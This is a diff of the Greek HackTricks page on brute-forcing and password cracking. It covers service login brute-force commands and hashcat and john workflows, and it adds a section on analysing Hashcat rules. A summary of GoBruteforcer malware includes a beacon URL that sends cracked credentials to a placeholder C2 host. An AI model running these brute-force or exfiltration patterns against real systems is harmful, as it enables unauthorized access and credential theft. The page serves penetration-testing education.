@@ -2,7 +2,7 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Προεπιλεγμένα διαπιστευτήρια
+## Προεπιλεγμένα Διαπιστευτήρια
 
 **Αναζητήστε στο Google** τα προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται ή **δοκιμάστε αυτούς τους συνδέσμους**:
 
@@ -21,7 +21,7 @@
 
 ## **Δημιουργήστε τα δικά σας λεξικά**
 
-Βρείτε όσο το δυνατόν περισσότερες πληροφορίες για τον στόχο και δημιουργήστε ένα προσαρμοσμένο λεξικό. Εργαλεία που μπορεί να βοηθήσουν:
+Συγκεντρώστε όσο το δυνατόν περισσότερες πληροφορίες για τον στόχο και δημιουργήστε ένα προσαρμοσμένο λεξικό. Εργαλεία που μπορεί να βοηθήσουν:
 
 ### Crunch
 
@@ -51,7 +51,7 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Δημιουργήστε κωδικούς πρόσβασης με βάση όσα γνωρίζετε για το θύμα (ονόματα, ημερομηνίες...)
+Δημιουργία κωδικών πρόσβασης με βάση όσα γνωρίζετε για το θύμα (ονόματα, ημερομηνίες...)
 
 ```
 python3 cupp.py -h
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-Ένα εργαλείο δημιουργίας wordlist, που σας επιτρέπει να παρέχετε ένα σύνολο λέξεων και να δημιουργείτε πολλαπλές παραλλαγές τους, ώστε να δημιουργήσετε μια μοναδική και ιδανική wordlist για έναν συγκεκριμένο στόχο.
+Ένα εργαλείο δημιουργίας wordlist που σας επιτρέπει να παρέχετε ένα σύνολο λέξεων και να δημιουργείτε πολλαπλές παραλλαγές τους, δημιουργώντας μια μοναδική και ιδανική wordlist για χρήση σε σχέση με έναν συγκεκριμένο στόχο.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -95,19 +95,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Ροή εργασιών bruteforcer σε όλο το Internet (διδάγματα από scanners βασισμένους σε Go)
+## Ροή εργασίας bruteforcer σε όλο το Internet (διδάγματα από scanners βασισμένους στο Go)
 
-Οι παρακάτω συμπεριφορές παρατηρήθηκαν στη ροή σάρωσης του malware GoBruteforcer· οι ακριβείς τιμές αφορούν το συγκεκριμένο δείγμα.<sup>[[1]](#references)</sup>
+Οι ακόλουθες συμπεριφορές παρατηρήθηκαν στη ροή εργασίας σάρωσης του malware GoBruteforcer· οι ακριβείς τιμές αφορούν το συγκεκριμένο δείγμα.<sup>[[1]](#references)</sup>
 
-- Διατηρείτε **pools worker προσαρμοσμένα στην αρχιτεκτονική** (για παράδειγμα, 95 ταυτόχρονους workers σε `x86_64/arm64`, 85 σε `i686`, 35 σε `armv5tel` και 50 ως προεπιλογή σε άλλες αρχιτεκτονικές), ελέγχετε τους ενεργούς workers κάθε δευτερόλεπτο και εκκινείτε αντικαταστάτες όταν ο αριθμός τους πέφτει κάτω από τον στόχο· κάθε worker χειρίζεται το πολύ μία IP-στόχο πριν τερματιστεί.
-- Δημιουργείτε **τυχαίες δημόσιες IPv4**, αλλά απορρίπτετε προφανώς μη δρομολογήσιμα και επιλεγμένα εύρη που αποφεύγουν οι χειριστές: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) και `/8`s που σχετίζονται με το DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Ελέγχετε τη θύρα της υπηρεσίας** με σύντομο timeout (~2s) πριν δοκιμάσετε **συνδέσεις με διαπιστευτήρια σε cleartext** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin μέσω HTTP/80) και χρησιμοποιείτε μια μικρή ενσωματωμένη λίστα διαπιστευτηρίων αν αποτύχει η λήψη διαπιστευτηρίων από το C2.
-- **Εξάγετε τα ευρήματα** μέσω μικρών HTTP GET beacon, όπως `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (κωδικοί υπηρεσιών όπως `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), επαναχρησιμοποιώντας ένα κοινό browser User-Agent για να αναμειγνύεται με τη συνηθισμένη κίνηση.
-- Το **phpMyAdmin spray** μπορεί να δοκιμάσει με brute-force περίπου 80 πιθανά paths με `GET /index.php?lang=en`, να εντοπίσει δείκτες PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) και να αναλύσει το `codemirror.css?v=X.Y.Z` για να επιλέξει μέθοδο authentication: οι εκδόσεις `<4.9` δέχονται GET params `pma_username`/`pma_password`· οι εκδόσεις `>=4.9` χρησιμοποιούν POST με `server=1`, CSRF `token` και τα ίδια διαπιστευτήρια.
+- Διατηρήστε **pools εργατών προσαρμοσμένα στην αρχιτεκτονική** (για παράδειγμα, 95 ταυτόχρονους εργάτες σε `x86_64/arm64`, 85 σε `i686`, 35 σε `armv5tel` και 50 από προεπιλογή σε άλλες αρχιτεκτονικές), ελέγχετε τους ενεργούς εργάτες κάθε δευτερόλεπτο και δημιουργείτε αντικαταστάτες όταν ο αριθμός τους πέφτει κάτω από τον στόχο· κάθε εργάτης χειρίζεται το πολύ μία IP-στόχο και μετά τερματίζεται.
+- Δημιουργήστε **τυχαίες δημόσιες IPv4** και απορρίψτε τις προφανώς μη δρομολογήσιμες και επιλεγμένες περιοχές που αποφεύγει ο operator: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8` με μεγάλη συγκέντρωση cloud (`3/15/16/56`) και `/8` που σχετίζονται με το DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Ελέγξτε τη θύρα της υπηρεσίας** με σύντομο timeout (~2s) πριν επιχειρήσετε **logins σε cleartext** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin μέσω HTTP/80) και χρησιμοποιήστε μια **μικρή ενσωματωμένη λίστα διαπιστευτηρίων** αν αποτύχει η λήψη διαπιστευτηρίων από το C2.
+- **Κάντε exfiltrate τα ευρήματα** μέσω μικρών HTTP GET beacon, όπως `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (κωδικοί υπηρεσιών όπως `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), επαναχρησιμοποιώντας ένα κοινό browser User-Agent για να μην ξεχωρίζουν.
+- Το **phpMyAdmin spray** μπορεί να κάνει brute-force περίπου 80 πιθανών paths με `GET /index.php?lang=en`, να εντοπίσει δείκτες PMA (θέμα `pmahomme`/`phpmyadmin.css`/`navigation.php`) και να αναλύσει το `codemirror.css?v=X.Y.Z` για να επιλέξει μέθοδο authentication: οι εκδόσεις `<4.9` δέχονται παραμέτρους GET `pma_username`/`pma_password`· οι εκδόσεις `>=4.9` χρησιμοποιούν POST με `server=1`, CSRF `token` και τα ίδια διαπιστευτήρια.
 
 ## Υπηρεσίες
 
-Αλφαβητική σειρά βάσει ονόματος υπηρεσίας.
+Ταξινομημένες αλφαβητικά με βάση το όνομα της υπηρεσίας.
 
 ### AFP
 
@@ -177,7 +177,7 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
 
-### HTTP Γενικό Brute
+### Γενικό HTTP Brute Force
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -345,13 +345,13 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
 
-Για να χρησιμοποιήσετε το **oracle_login** με το **patator**, πρέπει να το **εγκαταστήσετε**:
+Για να χρησιμοποιήσετε το **oracle_login** με το **patator**, πρέπει να εγκαταστήσετε:
 
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**εκδόσεις 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** και **11.2.0.3**):
+[Brute force hash OracleSQL εκτός σύνδεσης](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**εκδόσεις 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** και **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -384,7 +384,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 
 ### PPTP
 
-Μπορείτε να κατεβάσετε το πακέτο `.deb` για εγκατάσταση από τη διεύθυνση [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
+Μπορείτε να κατεβάσετε το πακέτο `.deb` για εγκατάσταση από [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
 
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
@@ -513,11 +513,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 
 #### Αδύναμα SSH keys / προβλέψιμο PRNG του Debian
 
-Ορισμένα συστήματα έχουν γνωστά ελαττώματα στο random seed που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε δραματικά μικρότερο keyspace, το οποίο μπορεί να γίνει brute force με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Διατίθενται επίσης προ-δημιουργημένα σύνολα αδύναμων keys, όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Ορισμένα συστήματα έχουν γνωστά ελαττώματα στο τυχαίο seed που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε δραματικά μικρότερο keyspace, στο οποίο μπορεί να γίνει bruteforce με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Διατίθενται επίσης προπαραγμένα σύνολα αδύναμων keys, όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ και OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-Το text protocol STOMP είναι ένα ευρέως χρησιμοποιούμενο πρωτόκολλο ανταλλαγής μηνυμάτων που **επιτρέπει την απρόσκοπτη επικοινωνία και αλληλεπίδραση με δημοφιλείς υπηρεσίες message queueing**, όπως τα RabbitMQ, ActiveMQ, HornetQ και OpenMQ. Παρέχει μια τυποποιημένη και αποδοτική προσέγγιση για την ανταλλαγή μηνυμάτων και την εκτέλεση διαφόρων λειτουργιών ανταλλαγής μηνυμάτων.
+Το πρωτόκολλο κειμένου STOMP είναι ένα ευρέως χρησιμοποιούμενο πρωτόκολλο ανταλλαγής μηνυμάτων που **επιτρέπει την απρόσκοπτη επικοινωνία και αλληλεπίδραση με δημοφιλείς υπηρεσίες message queueing**, όπως οι RabbitMQ, ActiveMQ, HornetQ και OpenMQ. Παρέχει μια τυποποιημένη και αποδοτική προσέγγιση για την ανταλλαγή μηνυμάτων και την εκτέλεση διαφόρων λειτουργιών ανταλλαγής μηνυμάτων.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -566,7 +566,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 
 ## Τοπικά
 
-### Διαδικτυακές βάσεις δεδομένων cracking
+### Online βάσεις δεδομένων cracking
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
 - [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 με ή χωρίς ESS/SSP και με οποιαδήποτε τιμή challenge)
@@ -580,7 +580,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Ελέγξτε το πριν επιχειρήσετε να κάνετε brute force σε ένα Hash.
+Δείτε αυτό πριν επιχειρήσετε brute force σε ένα Hash.
 
 ### ZIP
 
@@ -602,7 +602,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-Πρέπει να γνωρίζετε το **plaintext** (ή μέρος του) **ενός αρχείου που περιέχεται** στο κρυπτογραφημένο zip. Μπορείτε να ελέγξετε **τα ονόματα και τα μεγέθη των αρχείων που περιέχονται** σε ένα κρυπτογραφημένο zip εκτελώντας: **`7z l encrypted.zip`**\
+Πρέπει να γνωρίζετε το **plaintext** (ή μέρος του plaintext) **ενός αρχείου που περιέχεται** στο κρυπτογραφημένο zip. Μπορείτε να ελέγξετε **τα ονόματα και τα μεγέθη των αρχείων που περιέχονται** σε ένα κρυπτογραφημένο zip εκτελώντας: **`7z l encrypted.zip`**\
 Κατεβάστε το [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) από τη σελίδα των releases.
 
 ```bash
@@ -643,7 +643,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 
 ### Κωδικός πρόσβασης κατόχου PDF
 
-Για να σπάσετε έναν κωδικό πρόσβασης κατόχου PDF, δείτε εδώ: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Για να κάνετε crack τον κωδικό πρόσβασης κατόχου ενός PDF, δείτε αυτό: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 
@@ -685,7 +685,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
 
-### Lucks image
+### Εικόνα Lucks
 
 #### Μέθοδος 1
 
@@ -732,14 +732,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Χρησιμοποιήστε το [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) και έπειτα το john
+Χρησιμοποιήστε το [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) και στη συνέχεια το john
 
 ### Στήλη προστατευμένη με κωδικό πρόσβασης στο Open Office
 
-Αν έχετε ένα αρχείο xlsx με μια στήλη προστατευμένη με κωδικό πρόσβασης, μπορείτε να καταργήσετε την προστασία της:
+Αν έχετε ένα αρχείο xlsx με μια στήλη προστατευμένη με κωδικό πρόσβασης, μπορείτε να την αποπροστατεύσετε:
 
-- **Ανεβάστε το στο Google Drive** και ο κωδικός πρόσβασης θα αφαιρεθεί αυτόματα
-- Για να την **καταργήσετε** **χειροκίνητα**:
+- **Ανεβάστε το στο google drive** και ο κωδικός πρόσβασης θα αφαιρεθεί αυτόματα
+- Για να την **αφαιρέσετε** **χειροκίνητα**:
 
 ```bash
 unzip file.xlsx
@@ -770,24 +770,24 @@ hash-identifier
 > <HASH>
 ```
 
-### Wordlists
+### Λίστες λέξεων
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Εργαλεία δημιουργίας Wordlist**
+### **Εργαλεία δημιουργίας λιστών λέξεων**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Προηγμένη γεννήτρια μοτίβων πληκτρολόγησης με παραμετροποιήσιμους βασικούς χαρακτήρες, αντιστοίχιση πλήκτρων και διαδρομές.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Προηγμένο εργαλείο δημιουργίας keyboard-walk, με δυνατότητα διαμόρφωσης των βασικών χαρακτήρων, του keymap και των διαδρομών.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 
-### Μεταλλάξεις του John
+### John mutation
 
-Διαβάστε το _**/etc/john/john.conf**_ και διαμορφώστε το.
+Διαβάστε το _**/etc/john/john.conf**_ και ρυθμίστε το.
 
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
@@ -800,16 +800,44 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 - **Wordlist attack** (`-a 0`) με rules
 
-Το **Hashcat** περιλαμβάνει ήδη έναν **φάκελο με rules**, αλλά μπορείς να βρεις [**άλλα ενδιαφέροντα rules εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+Το **Hashcat** περιλαμβάνει ήδη έναν **φάκελο με rules**, αλλά μπορείτε να βρείτε [**άλλα ενδιαφέροντα rules εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 
-- **Επίθεση Wordlist combinator**
+#### Επεξήγηση και ανάλυση αρχείων κανόνων
 
-Είναι δυνατό να **συνδυάσετε 2 wordlists σε 1** με το hashcat.\
-Αν η λίστα 1 περιείχε τη λέξη **«hello»** και η δεύτερη περιείχε 2 γραμμές με τις λέξεις **«world»** και **«earth»**, θα δημιουργούνταν οι λέξεις `helloworld` και `helloearth`.
+Οι κανόνες του Hashcat εκτελούν opcodes από αριστερά προς τα δεξιά. Αυτό μπορεί εύκολα να παρερμηνευτεί όταν οι ενέργειες εφαρμόζονται στη θέση μηδέν: το `^e ^h ^t` προσθέτει πρώτα το `e`, έπειτα το `h` και τέλος το `t` στην αρχή, μετατρέποντας έτσι το `password` σε `thepassword`. Οι αντικαταστάσεις είναι συγκρίσεις byte με διάκριση πεζών-κεφαλαίων, επομένως ένας κανόνας όπως ο `sa@` δεν κάνει τίποτα σε ένα κεφαλαίο `A`. Δοκιμάστε άγνωστους κανόνες σε αντιπροσωπευτικές λέξεις βάσης με πεζά, κεφαλαία και συνδυασμό πεζών-κεφαλαίων, πριν αφιερώσετε χρόνο GPU σε αυτούς.<sup>[[6]](#references)[[9]](#references)</sup>
+
+Το [HashcatRosetta](https://github.com/bandrel/HashcatRosetta) μπορεί να εμφανίσει κάθε ενδιάμεσο υποψήφιο και να συνοψίσει την κατανομή των opcodes σε ένα πλήρες αρχείο κανόνων. Οι στατικές μετρήσεις των opcodes αποκαλύπτουν αν ένα αρχείο κυρίως προσθέτει χαρακτήρες στο τέλος ή στην αρχή, αντικαθιστά χαρακτήρες ή τους περικόπτει. Δεν αποδεικνύουν ότι ένας κανόνας θα σπάσει έναν κωδικό πρόσβασης, αλλά βοηθούν στην επιλογή ενός συνόλου κανόνων που ταιριάζει στα παρατηρούμενα μοτίβα κωδικών πρόσβασης του πληθυσμού-στόχου.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+uv tool install git+https://github.com/bandrel/HashcatRosetta.git
+hashcat-rosetta --explain '^e ^h ^t' --baseword password
+hashcat-rosetta rules.rule --analyze-rules
+```
+
+#### Μείωση πλεοναζόντων κανόνων με debug logs
+
+Η λειτουργία debug του Hashcat καταγράφει τους μετασχηματισμούς των rules ξεχωριστά από την κανονική έξοδο κατάστασης και αποτελεσμάτων. Η λειτουργία `4` γράφει `baseword:rule:candidate`, ενώ η λειτουργία `5` προσθέτει τη λίστα λέξεων προέλευσης. Ορίζετε πάντα ρητά το `--debug-file`. Διαφορετικά, το Hashcat ανοίγει το `hashcat.debugfile` στον φάκελο προφίλ του, και η ανακατεύθυνση του stdout καταγράφει τη ροή της κονσόλας αντί για αυτές τις εγγραφές. Τα αρχεία debug ανοίγονται σε λειτουργία προσθήκης, γι' αυτό διαγράψτε ή περιστρέψτε ένα παλιό αρχείο πριν από μια νέα μέτρηση και προστατεύστε το, επειδή περιέχει basewords και candidates σε απλό κείμενο.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+
+```bash
+rm -f debug.txt
+hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
+  -r rules.rule hashes.txt wordlist.txt
+hashcat-rosetta debug.txt --rules --metric candidates --top 25
+hashcat-rosetta debug.txt --basewords --detail
+hashcat-rosetta debug.txt --wordlists --detail
+hashcat-rosetta debug.txt --export report.json --format json
+```
+
+Χρησιμοποιήστε το `frequency` για να εντοπίσετε τους κανόνες που εφαρμόζονται συχνότερα, το `basewords` για να μετρήσετε την κάλυψη διακριτών εισόδων και το `candidates` για να μετρήσετε διακριτά αποτελέσματα. Η κατάταξη των candidates είναι συνήθως το καλύτερο σημείο εκκίνησης για περικοπή, επειδή ένας κανόνας που εφαρμόζεται συχνά μπορεί και πάλι να συγχωνεύει πολλές εισόδους σε διπλότυπα candidates. Αντιγράψτε τους κανόνες με τη μεγαλύτερη αξία σε ένα μικρότερο αρχείο, εκτελέστε τον ξανά στα εναπομείναντα hashes και συγκρίνετε τις αναφορές μεταξύ των εκτελέσεων. Η λειτουργία `5` δείχνει επίσης αν κάθε source wordlist συνεισφέρει χρήσιμα basewords· επιβάλετε την ανάλυση με `--debug-mode 4` ή `--debug-mode 5` όταν οι άνω και κάτω τελείες στα δεδομένα καθιστούν αμφίσημη την αυτόματη ανίχνευση.<sup>[[6]](#references)[[9]](#references)</sup>
+
+- **Wordlist combinator** attack
+
+Είναι δυνατό να **συνδυαστούν 2 wordlists σε 1** με το hashcat.\
+Αν η λίστα 1 περιείχε τη λέξη **"hello"** και η δεύτερη περιείχε 2 γραμμές με τις λέξεις **"world"** και **"earth"**. Θα δημιουργηθούν οι λέξεις `helloworld` και `helloearth`.
 
 ```bash
 # This will combine 2 wordlists
@@ -822,9 +850,9 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
-#### Επιθέσεις συνδυασμών βάσει γραμματικής (παράδειγμα κρυπτογραφημένου Office)
+#### Grammar-driven combinator attacks (παράδειγμα κρυπτογραφημένου Office)
 
-Ένας κωδικός πρόσβασης μπορεί να είναι μεγάλος και να περιέχει αρκετές κατηγορίες χαρακτήρων, αλλά να έχει μικρό **πραγματικό χώρο αναζήτησης** όταν ακολουθεί γνωστή γραμματική. Για ένα κρυπτογραφημένο έγγραφο Office που αποκτήθηκε κατά τη διάρκεια εξουσιοδοτημένης αξιολόγησης, το `office2john.py` εξάγει την εγγραφή επαλήθευσης κωδικού πρόσβασης· έτσι καθίσταται δυνατή η τοπική δοκιμή κωδικών, χωρίς διαδικτυακούς αποκλεισμούς, περιορισμό ρυθμού ή MFA. Δεν παρακάμπτει την κρυπτογράφηση του εγγράφου.<sup>[[2]](#references)[[5]](#references)</sup>
+Ένας κωδικός πρόσβασης μπορεί να είναι μεγάλος και να περιλαμβάνει διάφορες κατηγορίες χαρακτήρων, αλλά να έχει μικρό **αποτελεσματικό χώρο αναζήτησης** όταν ακολουθεί μια γνωστή γραμματική. Για ένα κρυπτογραφημένο έγγραφο Office που αποκτήθηκε κατά τη διάρκεια εξουσιοδοτημένης αξιολόγησης, το `office2john.py` εξάγει την εγγραφή επαλήθευσης κωδικού πρόσβασης· αυτό επιτρέπει τοπικές εικασίες χωρίς διαδικτυακούς αποκλεισμούς, περιορισμό ρυθμού ή MFA. Δεν παρακάμπτει την κρυπτογράφηση του εγγράφου.<sup>[[2]](#references)[[5]](#references)</sup>
 
 Αφαιρέστε το πεδίο ονόματος αρχείου που προσθέτει το John, ώστε το Hashcat να λάβει μόνο τον επαληθευτή:<sup>[[2]](#references)</sup>
 
@@ -833,9 +861,9 @@ python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
 head -c 40 office.hash; echo
 ```
 
-Επιλέξτε το `-m` με βάση το εξαγμένο πρόθεμα και όχι την επέκταση αρχείου. Το Hashcat αντιστοιχίζει τα `$office$*2007*`, `$office$*2010*` και `$office$*2013*` στις λειτουργίες `9400`, `9500` και `9600`· οι εγγραφές παλαιού τύπου `$oldoffice$0/$1` και `$oldoffice$3/$4` χρησιμοποιούν αντίστοιχα τις λειτουργίες `9700` και `9800`.<sup>[[3]](#references)</sup>
+Επιλέξτε το `-m` με βάση το εξαγόμενο πρόθεμα και όχι την επέκταση του αρχείου. Το Hashcat αντιστοιχίζει τα `$office$*2007*`, `$office$*2010*` και `$office$*2013*` στις λειτουργίες `9400`, `9500` και `9600`· οι εγγραφές παλαιού τύπου `$oldoffice$0/$1` και `$oldoffice$3/$4` χρησιμοποιούν αντίστοιχα τις λειτουργίες `9700` και `9800`.<sup>[[3]](#references)</sup>
 
-Αν πληροφορίες από επαναχρησιμοποίηση κωδικών πρόσβασης, πολιτικές, υποδείξεις ή άτομα που γνωρίζουν τον χρήστη αποκαλύπτουν μια γραμματική όπως `<word><number><optional !><word>`, δημιουργήστε ως αριστερό λεξικό το πρόθεμα που μπορεί να απαριθμηθεί ανεξάρτητα. Αυτό το παράδειγμα δοκιμάζει αριθμούς από `0` έως `99`· αντικαταστήστε το εύρος και τους μετασχηματισμούς με στοιχεία από την αξιολόγηση.<sup>[[5]](#references)</sup>
+Αν πληροφορίες από επαναχρησιμοποίηση κωδικών πρόσβασης, πολιτικές, υποδείξεις ή άτομα που γνωρίζουν τον χρήστη αποκαλύπτουν μια γραμματική όπως `<word><number><optional !><word>`, δημιουργήστε το ανεξάρτητα απαριθμήσιμο πρόθεμα ως αριστερό λεξικό. Αυτό το παράδειγμα δοκιμάζει αριθμούς από `0` έως `99`· προσαρμόστε το εύρος και τους μετασχηματισμούς στα στοιχεία της αξιολόγησης.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -845,13 +873,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Η λειτουργία επίθεσης `1` του Hashcat προσθέτει κάθε γραμμή του δεξιού λεξικού σε κάθε γραμμή του αριστερού λεξικού, επομένως αρχεία που περιέχουν `L` και `R` γραμμές παράγουν `L × R` υποψήφιες συμβολοσειρές πριν από την εφαρμογή τυχόν κανόνων. Η ακόλουθη εντολή αφορά συγκεκριμένα μια εγγραφή παλαιού τύπου `$oldoffice$3/$4`· αλλάξτε τη λειτουργία για άλλες μορφές Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Η λειτουργία επίθεσης `1` του Hashcat προσαρτά κάθε γραμμή του δεξιού λεξικού σε κάθε γραμμή του αριστερού λεξικού, επομένως αρχεία που περιέχουν `L` και `R` γραμμές παράγουν `L × R` υποψήφιους κωδικούς πριν από την εφαρμογή τυχόν rules. Η ακόλουθη εντολή προορίζεται ειδικά για εγγραφή παλαιού τύπου `$oldoffice$3/$4`· αλλάξτε τη λειτουργία για άλλες μορφές Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-Αυτό το μοτίβο προεπεξεργασίας εφαρμόζεται και σε άλλες μορφές που μπορούν να επαληθευτούν offline: απαρίθμησε μόνο εύλογες παραλλαγές κεφαλαίων/πεζών, ημερομηνιών, διαχωριστικών, ψηφίων ή σημείων στίξης για ένα στοιχείο και, στη συνέχεια, συνδύασέ το με το υπόλοιπο στοιχείο αντί να κάνεις brute-force σε όλο το θεωρητικό μήκος.<sup>[[4]](#references)[[5]](#references)</sup>
+Αυτό το μοτίβο προεπεξεργασίας μπορεί να εφαρμοστεί και σε άλλες μορφές που επαληθεύονται offline: απαριθμήστε μόνο εύλογες παραλλαγές κεφαλαίων και πεζών, ημερομηνιών, διαχωριστικών, ψηφίων ή σημείων στίξης για ένα στοιχείο και, στη συνέχεια, συνδυάστε το με το υπόλοιπο στοιχείο αντί να κάνετε brute-force σε όλο το ονομαστικό μήκος.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -887,6 +915,16 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
 
+#### Επικυρώστε τα αρχεία `.hcmask` πριν από την εκτέλεση
+
